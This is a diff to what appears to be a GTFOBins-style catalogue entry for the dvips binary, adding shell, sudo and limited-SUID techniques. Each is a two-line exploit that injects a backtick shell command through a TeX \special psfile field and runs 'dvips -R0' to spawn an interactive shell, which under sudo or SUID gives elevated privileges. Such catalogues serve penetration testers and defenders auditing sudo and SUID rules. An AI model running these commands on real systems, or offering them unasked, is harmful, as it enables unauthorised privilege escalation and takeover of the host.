@@ -1,8 +1,16 @@
+---
+description: The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.
 functions:
+  shell:
+    - code: |
+        tex '\special{psfile="`/bin/sh 1>&0"}\end'
+        dvips -R0 texput.dvi
   sudo:
     - code: |
-        echo "\documentclass[12pt]{article} \begin{document}" > file.tex
-        echo '$$\hbox to5cm{\vbox to5cm{\vfil\special{psfile="`PROGRAM > /tmp/result"}}\hfill}$$' >> file.tex
-        echo "\end{document}" >> file.tex
-        tex -interaction=nonstopmode file.tex && sudo dvips -R0 file.dvi
-        cat /tmp/result
+        tex '\special{psfile="`/bin/sh 1>&0"}\end'
+        sudo dvips -R0 texput.dvi
+  limited-suid:
+    - code: |
+        tex '\special{psfile="`/bin/sh 1>&0"}\end'
+        ./dvips -R0 texput.dvi
+---
